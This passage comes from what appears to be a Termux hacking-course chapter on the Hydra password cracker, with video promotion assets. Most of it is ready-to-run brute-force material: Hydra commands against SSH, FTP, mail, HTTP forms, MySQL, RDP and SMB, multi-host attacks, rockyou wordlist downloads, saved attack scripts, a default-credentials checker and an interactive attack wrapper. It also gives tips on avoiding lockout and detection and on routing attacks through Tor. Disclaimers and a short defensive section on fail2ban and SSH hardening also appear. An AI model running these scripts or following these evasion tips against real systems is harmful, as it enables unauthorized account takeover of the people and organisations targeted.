hydra -l admin@domain.com -P passwords.txt -S smtp://192.168.1.100

# POP3 brute force
hydra -l user@domain.com -P passwords.txt pop3://192.168.1.100

# IMAP brute force
hydra -l user@domain.com -P passwords.txt imap://192.168.1.100
```

### Multiple Targets

```bash
# Create targets file
echo "192.168.1.100" > targets.txt
echo "192.168.1.101" >> targets.txt
echo "192.168.1.102" >> targets.txt

# Attack multiple targets
hydra -M targets.txt -l root -P passwords.txt ssh

# With parallel hosts
hydra -M targets.txt -l root -P passwords.txt -T 4 ssh
```

### Advanced Options

```bash
# Restore interrupted attack
hydra -R

# Debug mode
hydra -l admin -P passwords.txt -d ssh://192.168.1.100

# Colored output
hydra -l admin -P passwords.txt -c ssh://192.168.1.100

# Use proxy
hydra -s 127.0.0.1:9050 -l admin -P passwords.txt ssh://target

# Exit after first success on any host
hydra -M targets.txt -l admin -P passwords.txt -F ssh

# Specify connection timeout
hydra -l admin -P passwords.txt -w 30 ssh://192.168.1.100

# Wait between connections
hydra -l admin -P passwords.txt -W 2 ssh://192.168.1.100

# JSON output format
hydra -l admin -P passwords.txt -b json -o results.json ssh://192.168.1.100
```

### Wordlist Commands

```bash
# Download rockyou.txt
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
tar -xzf rockyou.txt.tar.gz

# Download from SecLists
git clone https://github.com/danielmiessler/SecLists.git

# View wordlist size
wc -l wordlist.txt

# Check wordlist content
head -20 wordlist.txt

# Generate with crunch - basic
crunch 4 4 abcdefgh -o 4char.txt

# Generate with crunch - pattern
crunch 8 8 -t pass@@@@ -o pattern.txt

# Generate with crunch - numbers only
crunch 6 6 0123456789 -o numbers.txt

# Generate with crunch - mixed
crunch 8 8 -t @@%%^^@@ -o mixed.txt

# Generate with crunch - split by size
crunch 8 8 abcdefgh -b 1mb -o START

# Generate with crunch - permutations
crunch 1 1 -p admin root user test

# Create targeted wordlist
cat > custom.txt << EOF
password
Password1
P@ssword
P@ssw0rd
P@ssw0rd!
admin123
Admin123!
Admin@123
EOF
```

### Hydra Help Commands

```bash
# Main help
hydra -h

# Version
hydra --version

# Protocol-specific options
hydra -U ssh
hydra -U ftp
hydra -U http-post-form
hydra -U mysql
hydra -U smtp
hydra -U rdp
hydra -U smb
```

---

## 💻 PRACTICE EXERCISES

### Exercise 1: Hydra Installation & Verification

```bash
# Task: Install and verify Hydra

# Step 1: Update packages
pkg update && pkg upgrade -y

# Step 2: Install Hydra
pkg install hydra -y

# Step 3: Check version
hydra --version

# Step 4: View help
hydra -h | head -30

# Step 5: List supported protocols
hydra -h | grep -A 1 "The following services"

# Expected: Hydra installed and working
```

### Exercise 2: Wordlist Preparation

```bash
# Task: Download and prepare wordlists

# Step 1: Create directory
mkdir -p ~/wordlists
cd ~/wordlists

# Step 2: Download rockyou.txt
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz

# Step 3: Extract
tar -xzf rockyou.txt.tar.gz

# Step 4: Check size
wc -l rockyou.txt

# Step 5: Create small test wordlist
head -100 rockyou.txt > test_100.txt

# Step 6: Create custom wordlist
cat > custom.txt << 'EOF'
admin
password
123456
qwerty
letmein
welcome
monkey
dragon
master
login
EOF

# Expected: Wordlists ready for testing
```

### Exercise 3: Custom Wordlist Generation

```bash
# Task: Create custom wordlists with Crunch

# Step 1: Install crunch
pkg install crunch -y

# Step 2: Generate 4-character passwords
crunch 4 4 abc123 -o 4char.txt

# Step 3: Check the file
head 4char.txt
wc -l 4char.txt

# Step 4: Generate pattern-based passwords
crunch 8 8 -t hacker@@ -o hacker_pattern.txt

# Step 5: View pattern results
head hacker_pattern.txt

# Step 6: Generate numeric passwords
crunch 6 6 0123456789 -o pins.txt

# Step 7: Check pins
wc -l pins.txt

# Expected: Multiple custom wordlists created
```

### Exercise 4: SSH Brute Force Test (Local Lab)

```bash
# Task: Test SSH brute force on local machine
# WARNING: Only test on YOUR OWN systems!

# Step 1: Start SSH server (if you have one)
# Or use a VM/container with SSH

# Step 2: Create test wordlist with known password
cat > test_pass.txt << 'EOF'
wrongpassword
notcorrect
your_actual_password_here
test123
EOF

# Step 3: Run Hydra
hydra -l your_username -P test_pass.txt -vV localhost ssh

# Step 4: Check results
cat hydra.restore  # If stopped

# Expected: Password found if correct password in list
```

### Exercise 5: HTTP Form Attack Simulation

```bash
# Task: Learn HTTP form attack syntax

# Step 1: Create a simple PHP login page for testing
# (On a local web server you own)

# Step 2: Identify the login form parameters
# Use browser DevTools or view page source

# Step 3: Note the form fields
# Example: username field = "user", password field = "pass"

# Step 4: Identify failure message
# Try wrong credentials and note the error message

# Step 5: Construct Hydra command
# hydra -l admin -P passwords.txt target http-post-form \
#       "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"

# Expected: Understanding of HTTP form attack syntax
```

### Exercise 6: Multi-Protocol Attack Planning

```bash
# Task: Plan attacks for different protocols

# Create attack scripts for documentation:

cat > ssh_attack.sh << 'EOF'
#!/bin/bash
# SSH Brute Force Attack
hydra -l root -P passwords.txt -t 4 -vV -o ssh_results.txt $1 ssh
EOF

cat > ftp_attack.sh << 'EOF'
#!/bin/bash
# FTP Brute Force Attack
hydra -l admin -P passwords.txt -t 8 -vV -o ftp_results.txt $1 ftp
EOF

cat > http_attack.sh << 'EOF'
#!/bin/bash
# HTTP Form Attack
hydra -l admin -P passwords.txt -vV -o http_results.txt $1 http-post-form \
      "/login:user=^USER^&pass=^PASS^:Invalid"
EOF

chmod +x *.sh

# Expected: Attack scripts ready for authorized testing
```

### Exercise 7: Results Analysis

```bash
# Task: Analyze and document Hydra results

# Step 1: Run a test attack with output
hydra -l admin -P passwords.txt -o results.txt localhost ssh

# Step 2: View results
cat results.txt

# Step 3: Parse JSON output
hydra -l admin -P passwords.txt -b json -o results.json localhost ssh
cat results.json

# Step 4: Create summary report
cat > report.txt << EOF
Password Cracking Test Report
=============================
Date: $(date)
Target: localhost
Service: SSH
Results:
$(cat results.txt)
EOF

# Expected: Documented results and report
```

---

## ⚠️ TROUBLESHOOTING

### Problem 1: "Hydra not found"

```bash
# Cause: Hydra not installed or not in PATH

# Solution 1: Install Hydra
pkg update && pkg upgrade -y
pkg install hydra -y

# Solution 2: Verify installation
which hydra
# Should show: /data/data/com.termux/files/usr/bin/hydra

# Solution 3: Check PATH
echo $PATH
# Should include /data/data/com.termux/files/usr/bin

# Solution 4: Reinstall
pkg uninstall hydra
pkg install hydra -y
```

### Problem 2: "Wordlist file not found"

```bash
# Cause: Incorrect file path

# Solution 1: Use absolute path
hydra -l admin -P /data/data/com.termux/files/home/wordlist.txt target ssh

# Solution 2: Navigate to wordlist directory
cd ~/wordlists
hydra -l admin -P rockyou.txt target ssh

# Solution 3: Check file exists
ls -la wordlist.txt
file wordlist.txt

# Solution 4: Check file permissions
chmod 644 wordlist.txt
```

### Problem 3: "Connection refused" or "Connection timeout"

```bash
# Cause: Target not reachable or service not running

# Solution 1: Check if target is up
ping -c 3 target_ip

# Solution 2: Check if port is open
nmap -p 22 target_ip

# Solution 3: Increase timeout
hydra -l admin -P pass.txt -w 30 target ssh

# Solution 4: Check firewall
# Target may have firewall blocking connections

# Solution 5: Verify service is running on target
# SSH: systemctl status sshd
# FTP: systemctl status vsftpd
```

### Problem 4: "Too many connections" or "Service dropped"

```bash
# Cause: Too many threads overwhelming target

# Solution 1: Reduce threads
hydra -l admin -P pass.txt -t 2 target ssh

# Solution 2: Add delay between connections
hydra -l admin -P pass.txt -W 1 target ssh

# Solution 3: Use slower approach
hydra -l admin -P pass.txt -t 1 -W 2 target ssh

# Recommended threads:
# SSH: 4 threads maximum
# FTP: 8-16 threads
# HTTP: 16-32 threads
```

### Problem 5: "No valid password found"

```bash
# Cause: Password not in wordlist

# Solution 1: Use larger wordlist
hydra -l admin -P rockyou.txt target ssh

# Solution 2: Generate targeted wordlist
crunch 8 8 -t admin@@@@ -o custom.txt
hydra -l admin -P custom.txt target ssh

# Solution 3: Try common variations
hydra -l admin -P pass.txt -e ns target ssh
# -e ns: try null password and same-as-login

# Solution 4: Check if username is correct
hydra -L users.txt -P pass.txt target ssh

# Solution 5: Use multiple wordlists
cat wordlist1.txt wordlist2.txt > combined.txt
hydra -l admin -P combined.txt target ssh
```

### Problem 6: "Error: compiled without LIBSSH"

```bash
# Cause: SSH module not compiled

# Solution 1: Reinstall Hydra with dependencies
pkg uninstall hydra
pkg install libssh
pkg install hydra -y

# Solution 2: Build from source
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra
./configure --with-ssl=/data/data/com.termux/files/usr
make
make install

# Solution 3: Check modules
hydra -h | grep ssh
```

### Problem 7: HTTP Form Attack Not Working

```bash
# Cause: Incorrect form parameters or failure string

# Solution 1: Analyze the form
# View page source, find <form> tag
# Note action URL and input names

# Solution 2: Test manually first
curl -X POST http://target/login \
     -d "username=admin&password=test"

# Solution 3: Use correct failure string
# Common strings: "Invalid", "Failed", "Error", "Incorrect"

# Solution 4: Debug mode
hydra -l admin -P pass.txt -d target http-post-form \
      "/login:user=^USER^&pass=^PASS^:Invalid"

# Solution 5: Check for CSRF tokens
# View form for hidden fields like token, csrf, nonce

# Solution 6: Use proper escaping
hydra -l admin -P pass.txt target http-post-form \
      "/login:user=^USER^&pass=^PASS^&token=abc123:Invalid"
```

### Problem 8: Attack Running Too Slow

```bash
# Cause: Large wordlist or slow network

# Solution 1: Increase threads (if target allows)
hydra -l admin -P pass.txt -t 16 target ftp

# Solution 2: Use smaller, targeted wordlist
head -1000 rockyou.txt > small.txt
hydra -l admin -P small.txt target ssh

# Solution 3: Filter wordlist for password policy
# Example: passwords with 8+ chars
grep '.\{8,\}' rockyou.txt > filtered.txt

# Solution 4: Resume interrupted attack
hydra -R

# Solution 5: Split wordlist
split -l 100000 rockyou.txt chunk_
# Run on multiple chunks in parallel
```

### Problem 9: "Out of memory" Error

```bash
# Cause: Wordlist too large for memory

# Solution 1: Use smaller wordlist
hydra -l admin -P small_wordlist.txt target ssh

# Solution 2: Increase Termux memory (if possible)
# Close other apps

# Solution 3: Process in chunks
split -l 100000 big_wordlist.txt chunk_
for f in chunk_*; do
    hydra -l admin -P "$f" target ssh -f
done

# Solution 4: Use streaming
cat big_wordlist.txt | hydra -l admin -p "" -C - target ssh
```

### Problem 10: SSL/TLS Certificate Errors

```bash
# Cause: Self-signed or invalid certificates

# Solution 1: Ignore certificate errors (HTTP forms)
hydra -l admin -P pass.txt target https-post-form \
      "/login:user=^USER^&pass=^PASS^:Invalid"

# Solution 2: Use -S flag for SSL
hydra -S -l admin -P pass.txt target ssh

# Solution 3: For self-signed, proceed anyway
# Hydra typically handles this automatically
```

---

## 🎬 VIDEO ASSETS

### Thumbnail Concepts

**Option A: Professional Style**
```
┌────────────────────────────────────┐
│  [Dark Terminal Background]        │
│                                    │
│   🔓 HYDRA                         │
│   PASSWORD CRACKING                │
│                                    │
│   ✓ SSH | FTP | HTTP              │
│   ✓ 50+ Protocols                  │
│                                    │
│   [T3rmuxk1ng Logo]                │
└────────────────────────────────────┘
```

**Option B: Attack Visualization**
```
┌────────────────────────────────────┐
│  💥 BRUTE FORCE ATTACK             │
│                                    │
│  [Target] ────▶ 🔒                 │
│  [Hydra]  ────▶ 🔓 ACCESS!         │
│                                    │
│  Hydra Password Cracking           │
│  Chapter 31 | T3rmuxk1ng           │
└────────────────────────────────────┘
```

**Option C: Warning Style**
```
┌────────────────────────────────────┐
│  ⚠️ HACKING TOOL                   │
│                                    │
│   HYDRA                            │
│   Network Password Cracker         │
│                                    │
│   🎯 SSH | FTP | HTTP | SMB        │
│                                    │
│   FOR EDUCATIONAL USE ONLY         │
│   T3rmuxk1ng                       │
└────────────────────────────────────┘
```

### Video Description Template

```markdown
🔓 Hydra Password Cracking Basics | Brute Force Attacks in Termux

🔥 In this video you'll learn:
• Hydra kya hai aur kaise kaam karta hai
• Brute-force attack types explained
• Hydra installation in Termux
• SSH, FTP, HTTP attacks
• Wordlists management
• Custom wordlist creation with Crunch

⏱️ Timestamps:
0:00 - Introduction
0:50 - What is Hydra
4:00 - Brute-Force Attack Types
7:30 - Supported Protocols
10:00 - Hydra Installation
12:30 - Basic Syntax
16:00 - SSH Brute Force
19:00 - FTP Brute Force
21:30 - HTTP Form Attack
25:00 - Wordlists Management
28:00 - Custom Wordlists
31:00 - Advanced Options
34:00 - Summary

📥 Download Links:
• RockYou Wordlist: https://github.com/danielmiessler/SecLists
• SecLists: pkg install seclists

📝 Commands from this video:
pkg install hydra -y
hydra -l root -P passwords.txt ssh://192.168.1.100
hydra -l admin -P passwords.txt ftp://192.168.1.100
crunch 8 8 -t hacker@@ -o custom.txt

📚 Full Course Playlist:
[PLAYLIST LINK]

⚠️ DISCLAIMER: This video is for EDUCATIONAL PURPOSES ONLY.
Use these tools only on systems you own or have explicit permission to test.
Unauthorized hacking is ILLEGAL and can result in severe penalties.

📱 Follow T3rmuxk1ng:
• YouTube: @T3rmuxk1ng
• Telegram: [LINK]
• GitHub: [LINK]

#Hydra #PasswordCracking #BruteForce #Termux #T3rmuxk1ng #EthicalHacking #CyberSecurity #TermuxCourse #HindiTutorial

---
Legal Warning: Unauthorized access to computer systems is a criminal offense under IT Act 2000 (India) and similar laws worldwide. Always practice ethical hacking with proper authorization.
```

### Tags List

```
hydra, hydra password cracking, hydra tutorial, brute force attack,
brute force termux, hydra termux, password cracking, ethical hacking,
penetration testing, security testing, hydra ssh, hydra ftp, 
hydra http, wordlist, rockyou.txt, crunch wordlist, termux hacking,
termux security tools, termux course, t3rmuxk1ng, hindi tutorial,
cybersecurity, password attack, dictionary attack, credential testing,
network security, vulnerability assessment, security tools
```

### Hashtags

```
#Hydra #PasswordCracking #BruteForce #Termux #EthicalHacking 
#CyberSecurity #PenetrationTesting #SecurityTools #TermuxTutorial 
#T3rmuxk1ng #HindiTutorial #LearnHacking #Wordlist #Crunch
```

---

## 📚 ADDITIONAL RESOURCES

### Official Resources

| Resource | Link |
|----------|------|
| Hydra GitHub | https://github.com/vanhauser-thc/thc-hydra |
| THC Homepage | https://thc.org/ |
| Hydra Wiki | https://github.com/vanhauser-thc/thc-hydra/wiki |

### Wordlists

| Resource | Description |
|----------|-------------|
| SecLists | pkg install seclists |
| RockYou | https://github.com/danielmiessler/SecLists |
| CrackStation | https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm |
| Weakpass | https://weakpass.com/wordlist |

### Learning Resources

| Resource | Description |
|----------|-------------|
| Hydra Manual | `man hydra` (install man first) |
| Protocol Help | `hydra -U <protocol>` |
| TryHackMe | Practice platforms |
| HackTheBox | Real-world scenarios |

---

## 💡 PRO TIPS BOX

> 💡 **Pro Tip #1:** Always start with `-e nsr` flag before running a full wordlist attack. You'd be surprised how many systems have empty passwords, username-as-password, or reversed usernames!

> 💡 **Pro Tip #2:** Use `-t 4` for SSH brute forcing. Higher thread counts often cause SSH to drop connections or trigger rate limiting.

> 💡 **Pro Tip #3:** Save your progress with `-o output.txt` and use `-f` flag to exit on first success. Don't waste time after finding valid credentials.

> 💡 **Pro Tip #4:** For HTTP form attacks, always test manually first with wrong credentials to identify the exact failure string.

> 💡 **Pro Tip #5:** Combine Hydra with Nmap: First scan for open ports, then target only discovered services. `nmap -p 21,22,80,443 --open target -oG - | awk '/open/ {print $2}' > targets.txt`

> 💡 **Pro Tip #6:** Use `-W 1` to add delay between attempts. This helps avoid account lockouts and detection on sensitive systems.

> 💡 **Pro Tip #7:** Create targeted wordlists based on company name, year, and common patterns. Most corporate passwords follow patterns like Company@2024, Company123!, etc.

> 💡 **Pro Tip #8:** For large networks, use `-M targets.txt` to test multiple hosts simultaneously instead of attacking one at a time.

> 💡 **Pro Tip #9:** Use `hydra -R` to resume interrupted attacks. Always! Long attacks can crash, and you don't want to start from scratch.

> 💡 **Pro Tip #10:** Mask your attacks through Tor or proxies using `-proxy socks5://127.0.0.1:9050` for anonymity during authorized testing.

---

## 🔥 REAL WORLD APPLICATIONS

### Bug Bounty Scenario: Default Credentials Check

```bash
#!/bin/bash
# Bug Bounty: Check for default credentials on discovered services
# Usage: ./default_creds.sh target_ip

TARGET=$1

echo "[*] Checking for default credentials on $TARGET"

# Common default credentials
CREDS=(
    "admin:admin"
    "admin:password"
    "admin:admin123"
    "root:root"
    "admin:"
    "guest:guest"
    "user:user"
)

# Test SSH
for cred in "${CREDS[@]}"; do
    user=$(echo $cred | cut -d: -f1)
    pass=$(echo $cred | cut -d: -f2)
    echo "[*] Testing SSH: $user:$pass"
    hydra -l "$user" -p "$pass" -f ssh://$TARGET 2>/dev/null && break
done

# Test FTP
for cred in "${CREDS[@]}"; do
    user=$(echo $cred | cut -d: -f1)
    pass=$(echo $cred | cut -d: -f2)
    echo "[*] Testing FTP: $user:$pass"
    hydra -l "$user" -p "$pass" -f ftp://$TARGET 2>/dev/null && break
done

echo "[!] Scan complete"
```

### Penetration Testing Workflow: Password Audit

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    HYDRA IN PENETRATION TESTING                           │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  PHASE 1: SERVICE DISCOVERY                                             │
│  ─────────────────────────                                              │
│  nmap -sV -p 21,22,23,80,443,3306,3389 target.com                       │
│  → Identify running services and versions                               │
│                                                                          │
│  PHASE 2: QUICK WINS (-e nsr)                                           │
│  ─────────────────────────────                                          │
│  hydra -l admin -e nsr ssh://target.com                                 │
│  → Test null, same-as-username, reversed passwords                      │
│                                                                          │
│  PHASE 3: DEFAULT CREDENTIALS                                           │
│  ─────────────────────────                                              │
│  hydra -C default_creds.txt ssh://target.com                            │
│  → Test known default username:password combinations                    │
│                                                                          │
│  PHASE 4: DICTIONARY ATTACK                                             │
│  ─────────────────────────                                              │
│  hydra -L users.txt -P rockyou.txt -t 4 -o results.txt ssh://target     │
│  → Full wordlist attack with output logging                             │
│                                                                          │
│  PHASE 5: TARGETED ATTACK                                               │
│  ─────────────────────────                                              │
│  hydra -l admin -P company_wordlist.txt ssh://target                    │
│  → Use company-specific wordlist                                        │
│                                                                          │
│  PHASE 6: DOCUMENTATION                                                 │
│  ─────────────────────                                                  │
│  → Document all findings in report                                      │
│  → Include timestamps, credentials found, services tested               │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Real Case Study: SSH Brute Force Audit

```
TARGET: 192.168.1.100 (Authorized Penetration Test)
SERVICE: SSH (OpenSSH 7.6p1)

STEP 1: Service Enumeration
$ nmap -sV -p 22 192.168.1.100
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu

STEP 2: Quick Win Attempt
$ hydra -l root -e nsr 192.168.1.100 ssh
[22][ssh] host: 192.168.1.100 login: root password: root
[STATUS] attack finished for 192.168.1.100 (valid pair found)

FINDING: Default root credentials (root:root) were still active!
RISK: Critical - Full system compromise possible
REMEDIATION: Change default credentials immediately
```

---

## ⚡ QUICK REFERENCE CARD

### Hydra Command Syntax Quick Reference

| Attack Type | Command Syntax |
|------------|----------------|
| **SSH Single User** | `hydra -l user -P wordlist.txt ssh://target` |
| **SSH Multiple Users** | `hydra -L users.txt -P wordlist.txt ssh://target` |
| **FTP Attack** | `hydra -l admin -P wordlist.txt ftp://target` |
| **HTTP POST Form** | `hydra -l user -P pass.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"` |
| **HTTP Basic Auth** | `hydra -l admin -P pass.txt target http-get` |
| **MySQL Attack** | `hydra -l root -P pass.txt mysql://target` |
| **RDP Attack** | `hydra -l admin -P pass.txt rdp://target` |
| **SMB Attack** | `hydra -l admin -P pass.txt smb://target` |
| **Multiple Targets** | `hydra -l admin -P pass.txt -M targets.txt ssh` |
| **With Output** | `hydra -l admin -P pass.txt -o results.txt ssh://target` |

### Hydra Options Quick Reference

| Option | Description | Example |
|--------|-------------|---------|
| `-l` | Single username | `-l admin` |
| `-L` | Username list file | `-L users.txt` |
| `-p` | Single password | `-p password123` |
| `-P` | Password list file | `-P rockyou.txt` |
| `-C` | Combo file (user:pass) | `-C combos.txt` |
| `-t` | Threads/parallel tasks | `-t 4` |
| `-vV` | Verbose (show attempts) | `-vV` |
| `-o` | Output file | `-o results.txt` |
| `-f` | Exit on first success | `-f` |
| `-e` | Extra checks (n/s/r) | `-e nsr` |
| `-s` | Custom port | `-s 2222` |
| `-S` | Use SSL | `-S` |
| `-W` | Wait between attempts | `-W 1` |
| `-R` | Restore session | `hydra -R` |
| `-M` | Multiple targets file | `-M targets.txt` |

### Recommended Thread Counts by Protocol

| Protocol | Safe Threads | Aggressive Threads | Notes |
|----------|--------------|-------------------|-------|
| SSH | 4 | 8 | Higher causes drops |
| FTP | 8 | 16 | Generally stable |
| HTTP | 10 | 30 | Watch for rate limits |
| MySQL | 4 | 8 | Connection limits |
| RDP | 3 | 5 | Very sensitive |
| SMB | 4 | 8 | Account lockout risk |
| Telnet | 8 | 16 | No limits usually |

---

## 🏆 BONUS: ADVANCED EXPLOITATION

### Hydra Wrapper Script

```bash
#!/bin/bash
# Advanced Hydra Wrapper for Penetration Testing
# Author: T3rmuxk1ng

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Wordlists
WORDLIST_SMALL="/sdcard/wordlists/top1000.txt"
WORDLIST_MEDIUM="/sdcard/wordlists/top10000.txt"
WORDLIST_LARGE="/sdcard/wordlists/rockyou.txt"

banner() {
    echo -e "${BLUE}"
    echo "╔═════════════════════════════════════════════════════╗"
    echo "║         HYDRA ADVANCED WRAPPER v2.0                  ║"
    echo "║              by T3rmuxk1ng                          ║"
    echo "╚═════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Quick credential check
quick_check() {
    local target=$1
    local service=$2
    
    echo -e "${YELLOW}[*] Running quick credential check...${NC}"
    
    # Common usernames
    local users=("admin" "root" "user" "administrator" "guest" "test")
    
    for user in "${users[@]}"; do
        echo -e "${BLUE}[*] Testing: $user${NC}"
        result=$(hydra -l "$user" -e nsr -f "$target" "$service" 2>&1)
        
        if echo "$result" | grep -q "login:"; then
            echo -e "${GREEN}[+] FOUND: $result${NC}"
            return 0
        fi
    done
    
    echo -e "${RED}[-] No quick wins found${NC}"
}

# Full wordlist attack
full_attack() {
    local target=$1
    local service=$2
    local user=$3
    local wordlist=$4
    
    echo -e "${YELLOW}[*] Starting full attack...${NC}"
    echo "[*] Target: $target"
    echo "[*] Service: $service"
    echo "[*] User: $user"
    echo "[*] Wordlist: $wordlist"
    
    hydra -l "$user" -P "$wordlist" -f -o results.txt -t 4 "$target" "$service"
    
    if [ -f results.txt ]; then
        echo -e "${GREEN}[+] Results saved to results.txt${NC}"
        cat results.txt
    fi
}

# HTTP form attack
http_form_attack() {
    local target=$1
    local form_path=$2
    local user_param=$3
    local pass_param=$4
    local fail_string=$5
    local user=$6
    local wordlist=$7
    
    echo -e "${YELLOW}[*] HTTP Form Attack${NC}"
    
    hydra -l "$user" -P "$wordlist" "$target" http-post-form \
        "$form_path:$user_param=^USER^&$pass_param=^PASS^:$fail_string" \
        -o http_results.txt
    
    if [ -f http_results.txt ]; then
        echo -e "${GREEN}[+] HTTP results saved${NC}"
    fi
}

# Main menu
main() {
    banner
    
    echo -e "${YELLOW}Select Attack Type:${NC}"
    echo "1. Quick Credential Check (-e nsr)"
    echo "2. SSH Brute Force"
    echo "3. FTP Brute Force"
    echo "4. HTTP Form Attack"
    echo "5. MySQL Attack"
    echo "6. Custom Attack"
    echo "7. Resume Previous Attack"
    
    read -p "Enter choice: " choice
    
    case $choice in
        1)
            read -p "Enter target: " target
            read -p "Enter service (ssh/ftp/http-get): " service
            quick_check "$target" "$service"
            ;;
        2)
            read -p "Enter target: " target
            read -p "Enter username: " user
            read -p "Wordlist (1=small, 2=medium, 3=large): " wl
            [ "$wl" = "1" ] && wordlist=$WORDLIST_SMALL
            [ "$wl" = "2" ] && wordlist=$WORDLIST_MEDIUM
            [ "$wl" = "3" ] && wordlist=$WORDLIST_LARGE
            full_attack "$target" ssh "$user" "$wordlist"
            ;;
        3)
            read -p "Enter target: " target
            read -p "Enter username: " user
            read -p "Wordlist path: " wordlist
            full_attack "$target" ftp "$user" "$wordlist"
            ;;
        4)
            read -p "Enter target: " target
            read -p "Form path (e.g., /login): " path
            read -p "Username parameter: " uparam
            read -p "Password parameter: " pparam
            read -p "Failure string: " fail
            read -p "Username to test: " user
            read -p "Wordlist path: " wordlist
            http_form_attack "$target" "$path" "$uparam" "$pparam" "$fail" "$user" "$wordlist"
            ;;
        5)
            read -p "Enter target: " target
            read -p "Enter username (default: root): " user
            user=${user:-root}
            read -p "Wordlist path: " wordlist
            full_attack "$target" mysql "$user" "$wordlist"
            ;;
        6)
            echo "Enter custom hydra command (without 'hydra'):"
            read -p "hydra " cmd
            hydra $cmd
            ;;
        7)
            hydra -R
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            ;;
    esac
}

main
```

### Additional Tools to Complement Hydra

| Tool | Purpose | Installation |
|------|---------|--------------|
| **Patator** | Multi-purpose brute forcer | `pip install patator` |
| **Medusa** | Parallel network login auditor | `pkg install medusa` |
| **NCrack** | Network authentication cracker | `pkg install ncrack` |
| **Crowbar** | Brute force tool for special cases | `pip install crowbar` |
| **CeWL** | Custom wordlist generator | `gem install cewl` |
| **CUPP** | Common User Passwords Profiler | `git clone https://github.com/Mebus/cupp.git` |
| **Mentalist** | Wordlist generation GUI | Requires GUI |

---

## 📝 CHAPTER SUMMARY: What You Learned

### Key Concepts Mastered

- ✅ **Hydra Fundamentals**: What Hydra is, how it works, and its position in the security toolkit
- ✅ **Brute-Force Types**: Pure brute-force, dictionary attack, hybrid attack, and credential stuffing
- ✅ **50+ Supported Protocols**: SSH, FTP, HTTP, SMB, MySQL, RDP, and many more
- ✅ **Basic Syntax**: Username/password options, threads, output, verbose modes
- ✅ **Service-Specific Attacks**: SSH brute forcing, FTP attacks, HTTP form attacks
- ✅ **Wordlist Management**: rockyou.txt, SecLists, custom wordlist generation with Crunch
- ✅ **Advanced Options**: -e flag, -f flag, timing controls, and output handling

### Key Takeaways

1. **Authorization First**: Never use Hydra without explicit written permission
2. **Start Small**: Use `-e nsr` before full wordlist attacks
3. **Optimize Threads**: Different protocols have different optimal thread counts
4. **Save Everything**: Always use `-o` to log results
5. **Be Patient**: Large wordlists take time - use `-R` to resume if interrupted
6. **Stay Undetected**: Use delays (`-W`) when testing sensitive systems

---

## 🛡️ DEFENSIVE SECURITY: Protecting Against Brute Force

### Detection and Prevention Strategies

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    BRUTE FORCE DEFENSE STRATEGIES                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. ACCOUNT LOCKOUT POLICIES                                            │
│  ─────────────────────────                                              │
│  ├── Lock account after 3-5 failed attempts                             │
│  ├── Implement progressive delays                                       │
│  ├── Require CAPTCHA after failed attempts                              │
│  └── Temporary lockout (15-30 minutes)                                  │
│                                                                          │
│  2. MONITORING AND ALERTING                                             │
│  ─────────────────────────                                              │
│  ├── Log all failed login attempts                                      │
│  ├── Alert on multiple failed attempts from same IP                     │
│  ├── Alert on attempts against multiple accounts                        │
│  └── SIEM integration for correlation                                   │
│                                                                          │
│  3. RATE LIMITING                                                       │
│  ─────────────────────                                                  │
│  ├── Limit login attempts per minute                                    │
│  ├── Implement exponential backoff                                      │
│  ├── Use fail2ban or similar tools                                      │
│  └── Cloud-based WAF with rate limiting                                 │
│                                                                          │
│  4. STRONG PASSWORD POLICIES                                            │
│  ─────────────────────────────                                          │
│  ├── Minimum 12+ characters                                             │
│  ├── Complexity requirements                                            │
│  ├── Password history (prevent reuse)                                   │
│  └── Regular password changes                                           │
│                                                                          │
│  5. MULTI-FACTOR AUTHENTICATION                                         │
│  ───────────────────────────────                                        │
│  ├── TOTP (Time-based OTP)                                              │
│  ├── Hardware tokens                                                    │
│  ├── Biometric authentication                                           │
│  └── SMS backup (less secure)                                           │
│                                                                          │
│  6. NETWORK-LEVEL PROTECTION                                            │
│  ─────────────────────────────                                          │
│  ├── Geo-blocking suspicious countries                                  │
│  ├── IP allowlisting for sensitive services                             │
│  ├── VPN requirement for remote access                                  │
│  └── Honeypots for early detection                                      │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Fail2Ban Configuration Example

```bash
# Install fail2ban
sudo apt install fail2ban

# Configure SSH protection
sudo cat > /etc/fail2ban/jail.local << 'EOF'
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
findtime = 600
bantime = 3600
action = %(action_mwl)s

[ssh-ddos]
enabled = true
port = ssh
filter = sshd-ddos
logpath = /var/log/auth.log
maxretry = 2
EOF

# Start fail2ban
sudo systemctl restart fail2ban
sudo fail2ban-client status sshd
```

### SSH Hardening Against Brute Force

```bash
# Edit SSH config
sudo nano /etc/ssh/sshd_config

# Recommended settings:
Port 2222                        # Change default port
PermitRootLogin no               # Disable root login
MaxAuthTries 3                   # Limit authentication attempts
PasswordAuthentication no        # Disable password auth, use keys only
PubkeyAuthentication yes         # Enable key-based auth
AllowUsers user1 user2           # Allow only specific users
LoginGraceTime 30                # Disconnect after 30 seconds
ClientAliveInterval 300          # Disconnect inactive clients
MaxStartups 3                    # Limit concurrent connections

# Restart SSH
sudo systemctl restart sshd
```

---

## 📋 METHODOLOGY: Brute Force Attack Workflow

### Step-by-Step Attack Methodology

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    HYDRA ATTACK METHODOLOGY                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  STEP 1: AUTHORIZATION CHECK                                            │
│  ─────────────────────────                                              │
│  □ Verify written permission exists                                     │
